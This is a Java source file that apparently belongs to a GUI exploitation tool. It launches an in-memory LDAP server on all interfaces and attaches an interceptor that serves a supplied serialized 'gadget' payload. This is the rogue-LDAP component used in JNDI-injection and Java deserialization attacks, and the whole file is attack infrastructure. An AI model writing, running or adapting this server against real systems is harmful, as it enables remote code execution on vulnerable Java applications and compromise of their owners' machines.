package utools;

import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.sdk.LDAPException;
import interceptor.SerialOperationInterceptor;

import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;
import java.net.InetAddress;

import static utools.checkPanel.listenLDAPServer;

public class Service {
    private static final String LDAP_BASE = "dc=example,dc=com";
    public static InMemoryDirectoryServer ds;
    public static void launchLDAPServer(Integer ldap_port, byte[] gadget) throws Exception {
        InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
        config.setListenerConfigs(new InMemoryListenerConfig(
                "listen",
                InetAddress.getByName("0.0.0.0"),
                ldap_port,
                ServerSocketFactory.getDefault(),
                SocketFactory.getDefault(),
                (SSLSocketFactory) SSLSocketFactory.getDefault()));

        config.addInMemoryOperationInterceptor(new SerialOperationInterceptor(gadget));
        ds = new InMemoryDirectoryServer(config);
        // 启动新线程
        Thread listeningThread = new Thread(() -> {
            try {
                ds.startListening();
            } catch (LDAPException e) {
                throw new RuntimeException(e);
            }
        }
        );
        listeningThread.start();
        // 启动 LDAP 监听窗口
        listenLDAPServer(String.valueOf(ldap_port),listeningThread);
    }
}
